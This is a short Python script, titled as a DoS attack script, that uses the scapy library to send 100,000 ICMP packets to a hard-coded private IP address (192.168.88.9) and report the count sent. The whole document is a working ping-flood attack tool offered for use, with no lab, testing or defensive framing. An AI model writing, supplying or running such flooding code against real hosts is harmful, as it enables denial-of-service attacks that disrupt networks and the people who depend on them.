# DoS Attack Script


from scapy.all import IP, ICMP, send

def dos_attack(target_ip, count=100000):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, count=count, verbose=False)
    print(f"[+] Sent {count} ICMP packets to {target_ip}")

dos_attack("192.168.88.9")